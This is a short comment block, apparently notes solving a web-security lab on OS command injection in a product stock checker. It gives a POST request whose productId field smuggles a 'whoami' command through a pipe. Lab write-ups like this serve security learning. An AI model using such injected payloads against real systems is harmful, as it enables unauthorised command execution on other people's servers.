/*

OS command injection vulnerability in the product stock checker.
The app executes a shell command containing user-supplied 
product and store IDs, and returns the raw output in its response.

execute the whoami command to determine the name of the current user. 



1) POST /product/stock HTTP/2
productId=1| whoami & storeId=1


*/